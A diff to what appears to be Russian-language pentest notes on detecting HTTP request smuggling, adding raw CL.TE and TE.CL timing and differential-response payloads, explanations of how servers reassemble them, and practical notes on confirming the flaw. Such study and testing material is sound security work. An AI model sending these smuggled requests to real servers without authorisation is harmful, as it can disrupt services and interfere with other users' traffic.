@@ -133,6 +133,124 @@ K is the Kelvin symbol (%E2%84%AA) If the header is converted to lowercase, you 
 
 ## Как детектировать
 
+### Timing Techniques
+
+#### CL.TE Timing Detect
+
+Отправляем незакрытый TE chunk — бэк сервер отваливается по таймауту
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+A
+X
+```
+
+#### TE.CL Timing Detect
+
+Фронт сервер получает запрос двумя чанками, собирает его и отправляет на бэк сервер. Бэк смотрит на CL и ждет остатки данных (которых не будет) => это вызывает значительные временные задержки
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 6
+
+0
+
+X
+```
+
+### Differential responses
+
+#### CL.TE
+
+```
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 49
+Transfer-Encoding: chunked
+
+e
+q=smuggling&x=
+0
+
+GET /404 HTTP/1.1
+Foo: x
+```
+
+Суть в том, что на стороне фронтенд сервера, этот запрос пересобирается в:
+
+```
+GET /404 HTTP/1.1
+Foo: xPOST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+```
+
+и отправляется на бэк. Если получим 404, сервер уязвим к этому типу атаки
+
+#### TE.CL
+
+```
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+7c
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 144
+
+x=
+0
+
+
+```
+
+Если атака успешна, то на стороне фронтенд сервера запрос пересоберется в:
+
+```
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 146
+
+x=
+0
+
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+```
+
+и так отправится на сторону бэкенд-сервера -> если получим 404 — сервер уязвим к этому типу атаки
+
+### Notes
+
+При попытке проэксплуатировать этот тип уязвимости, следует помнить о некоторых важных соображениях:
+
+* Запросы с нормальным запросом и с пэйлоадом должны быть отправлены с разных сетевых подключений. Отправка обоих запросов через одно и то же соединение не докажет, что уязвимость существует
+* Запросы с нормальным запросом и с пэйлоадом должны использовать одни и те же имена URL и параметров, насколько это возможно. Тк балансер (фронт сервер) разные URL может отправить на разные бэкенд сервера. Использование одного набора URL и параметров повысит вероятность успешной атаки.
+* Так как можем попасть в гонку с другими запросами других пользователей, может потребоваться несколько раз провести отправку нормальных и запросов с пэйлоадами для подтверждения уязвимости.
+* При подтверждении уязвимости надо стараться не затрагивать других пользователей.
+
+### Tools
+
 Smuggler extension for Burp: [https://kalilinuxtutorials.com/http-request-smuggler-extension-burp-suite/](https://kalilinuxtutorials.com/http-request-smuggler-extension-burp-suite/)
 
 Python script: [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
